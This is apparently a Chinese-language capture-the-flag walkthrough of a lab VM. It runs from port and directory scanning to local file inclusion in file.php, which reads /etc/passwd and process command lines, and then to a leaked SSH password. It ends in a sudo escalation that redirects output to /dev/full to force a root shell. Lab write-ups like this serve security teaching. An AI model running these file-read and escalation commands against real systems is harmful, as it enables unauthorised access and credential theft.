一、信息收集
1、nmap端口扫描
```
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -sV -sC -p- 192.168.56.146                                
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-30 09:07 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.146
Host is up (0.0014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Welcome
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:AE:3A:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.39 seconds

```

2、gobuster目录扫描

```
┌──(root㉿kali)-[/home/kali/Desktop]
└─# gobuster dir -u http://192.168.56.146 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old,sql -t 50
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.146
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html,bak,old,sql
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.hta.bak             (Status: 403) [Size: 279]
/.hta.txt             (Status: 403) [Size: 279]
/.hta.html            (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.hta.old             (Status: 403) [Size: 279]
/.hta.sql             (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htaccess.old        (Status: 403) [Size: 279]
/.htaccess.sql        (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess.bak        (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/.htpasswd.bak        (Status: 403) [Size: 279]
/.htpasswd.old        (Status: 403) [Size: 279]
/.htpasswd.sql        (Status: 403) [Size: 279]
/file.php             (Status: 500) [Size: 0]
/index.html           (Status: 200) [Size: 615]
/index.html           (Status: 200) [Size: 615]
/server-status        (Status: 403) [Size: 279]
Progress: 32291 / 32291 (100.00%)
===============================================================
Finished
===============================================================
```
开放了22、80端口，且80端口存在/file.php-Status:500(内部服务器错误)


二、漏洞复现
```
┌──(root㉿kali)-[/home/kali/Desktop]
└─# curl "http://192.168.56.146"                          
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        h1 {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <h1>Welcome to Maze-sec</h1>
    <p>认识的人越多 我就越喜欢狗</p>
</body>
</html>
   ```
```
 curl -i "http://192.168.56.146/file.php" 
HTTP/1.0 500 Internal Server Error
Date: Tue, 30 Jun 2026 13:27:32 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```
这个时候应该想到LFI（本地文件包含）漏洞，对其进行模糊测试

```
ffuf -u "http://192.168.56.146/file.php?FUZZ=/etc/passwd" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs 0 -t 50
```
发现file返回响应

```
┌──(root㉿kali)-[/home/kali/Desktop]
└─# curl -i "http://192.168.56.146/file.php?file=/etc/passwd"
HTTP/1.1 200 OK
Date: Tue, 30 Jun 2026 13:40:57 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Length: 1394
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
 ```
获得welcome用户，尝试读取/home/welcome/user.txt

```
┌──(root㉿kali)-[/home/kali/Desktop]
└─# curl -i "http://192.168.56.146/file.php?file=/home/welcome/user.txt"
HTTP/1.1 200 OK
Date: Tue, 30 Jun 2026 13:42:03 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 44
Content-Type: text/html; charset=UTF-8

flag{user-210f652e7e3b7e7359e523ef04e96295}
```


三、提权
使用PHP过滤器读取源码

```
┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─# curl -i "http://192.168.56.146/file.php?file=php://filter/read=convert.base64-encode/resource=file.php"
HTTP/1.1 200 OK
Date: Tue, 30 Jun 2026 13:45:25 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Length: 100
Content-Type: text/html; charset=UTF-8

PD9waHAKLy8gZmlsZS5waHAKJGZpbGUgPSAkX0dFVFsnZmlsZSddOwplY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKTsKPz4K                                                                                
┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─# curl -s "http://192.168.56.146/file.php?file=php://filter/read=convert.base64-encode/resource=file.php" | base64 -d
<?php
// file.php
$file = $_GET['file'];
echo file_get_contents($file);
?>
```

```
for i in $(seq 1 1000); do
  result=$(curl -s "http://192.168.56.146/file.php?file=/proc/$i/cmdline" \
    --output - | strings -1 | tr '\0' ' ')
  [ -n "$result" ] && echo "PID $i: $result"
done


┌──(root㉿kali)-[/home/kali/Desktop]
└─# for i in $(seq 1 1000); do
  result=$(curl -s "http://192.168.56.146/file.php?file=/proc/$i/cmdline" \
    --output - | strings -1 | tr '\0' ' ')
  [ -n "$result" ] && echo "PID $i: $result"
done
PID 1: /sbin/init
PID 225: /lib/systemd/systemd-journald
PID 249: /lib/systemd/systemd-udevd
PID 275: /lib/systemd/systemd-timesyncd
PID 316: /usr/sbin/cron
-f
PID 317: /usr/bin/dbus-daemon
--system
--address=systemd:
--nofork
--nopidfile
--systemd-activation
--syslog-only
PID 318: /usr/sbin/rsyslogd
-n
-iNONE
PID 319: /lib/systemd/systemd-logind
PID 320: /lib/systemd/systemd-timesyncd
PID 331: /usr/sbin/rsyslogd
-n
-iNONE
PID 332: /usr/sbin/rsyslogd
-n
-iNONE
PID 333: /usr/sbin/rsyslogd
-n
-iNONE
PID 334: /sbin/dhclient
-4
-v
-i
-pf
/run/dhclient.enp0s3.pid
-lf
/var/lib/dhcp/dhclient.enp0s3.leases
-I
-df
/var/lib/dhcp/dhclient6.enp0s3.leases
enp0s3
PID 341: service --user welcome --password 6WXqj9Vc2tdXQ3TN0z54 --host localhost --port 8080
infinity
PID 349: /usr/bin/python3
/usr/share/unattended-upgrades/unattended-upgrade-shutdown
--wait-for-signal
PID 352: /sbin/agetty
-o
-p -- 
--noclear
tty1
linux
PID 380: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
PID 405: /usr/sbin/apache2
-k
start
PID 407: /usr/bin/python3
/usr/share/unattended-upgrades/unattended-upgrade-shutdown
--wait-for-signal

```
发现PID 341: service --user welcome --password 6WXqj9Vc2tdXQ3TN0z54 --host localhost --port 8080
weclome:6WXqj9Vc2tdXQ3TN0z54

ssh连接

```
ssh welcome@192.168.56.146

```

<img width="1321" height="440" alt="Image" src="https://github.com/user-attachments/assets/fed2a50e-04a9-410a-a98d-678e1546802d" />

```
welcome@114:~$ sudo -l
Matching Defaults entries for welcome on 114:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on 114:
    (ALL) NOPASSWD: /opt/read.sh
    (ALL) NOPASSWD: /opt/short.sh
welcome@114:~$ cat /opt/read.sh
#!/bin/bash

echo "Input the flag:"
if head -1 | grep -q "$(< /root/root.txt)"
then
        echo "Y"
else
        echo "N"
fi
welcome@114:~$ cat /opt/short.sh
#!/bin/bash

PATH=/usr/bin
My_guess=$RANDOM

echo "This is script logic"
cat << EOF
if [ "$1" != "$My_guess" ] ;then
    echo "Nop"; 
else
    bash -i;
fi
EOF

[ "$1" != "$My_guess" ] && echo "Nop" || bash -i
welcome@114:~$ 
```
原本 short.sh 脚本是让我们从 0~32767 去猜数字，但是如果我们传入字母去猜测（比如 HELLO），它只会判断为‘不等于’然后执行 echo "Nop"，无法进入 shell。
所以，我们通过重定向污染的方式，在运行 sudo 之前，先将整个命令的标准输出（stdout）重定向到 /dev/full。这个损坏的输出环境会被 sudo 和脚本内部的所有命令继承。
这样一来，脚本在执行到 echo "Nop" 时，因为尝试写入 /dev/full 而失败（返回非 0 退出码），导致 && 短路失效，成功触发了 || 后面的 bash -i，获得了 root 权限的 shell。
但此时，这个 root shell 的标准输出（stdout）仍然指向 /dev/full，所以屏幕上看不到任何回显。因此，我们需要在这个 root shell 里执行 exec 1>/dev/tty，将标准输出重新指向当前终端，恢复回显。最后执行 cat /root/root.txt 拿到 flag。

```
welcome@114:~$ sudo /opt/short.sh HELLO >/dev/full
/opt/short.sh: line 6: echo: write error: No space left on device
cat: write error: No space left on device
/opt/short.sh: line 15: echo: write error: No space left on device
root@114:/home/welcome# ls
ls: write error: No space left on device
root@114:/home/welcome# id
id: write error: No space left on device
root@114:/home/welcome# exec 1>/dev/tty
root@114:/home/welcome# id
uid=0(root) gid=0(root) groups=0(root)
root@114:/home/welcome# ls -la
total 24
drwxr-xr-x 2 welcome welcome 4096 Jan 16 18:24 .
drwxr-xr-x 3 root    root    4096 Apr 11  2025 ..
lrwxrwxrwx 1 root    root       9 Jan 16 18:24 .bash_history -> /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11  2025 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11  2025 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11  2025 .profile
-rw-r--r-- 1 root    root      44 Jan 16 18:24 user.txt
root@114:/home/welcome# cd /root
root@114:~# ls 0la
ls: cannot access '0la': No such file or directory
root@114:~# ls -al
total 60
drwx------  6 root root  4096 Jan 16 18:50 .
drwxr-xr-x 18 root root  4096 Mar 18  2025 ..
-rw-r--r--  1 root root    21 Jan 16 18:20 114rrootpass.txt
lrwxrwxrwx  1 root root     9 Mar 18  2025 .bash_history -> /dev/null
-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
drwxr-xr-x  4 root root  4096 Apr  4  2025 .cache
drwx------  3 root root  4096 Apr  4  2025 .gnupg
drwxr-xr-x  3 root root  4096 Mar 18  2025 .local
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root    44 Jan 16 18:20 root.txt
drw-------  2 root root  4096 Apr  4  2025 .ssh
-rw-rw-rw-  1 root root 17914 Jan 16 18:50 .viminfo
root@114:~# cat root.txt
flag{root-c3dbe270140775bb9fc6eaa2559f914f}
root@114:~# 
```



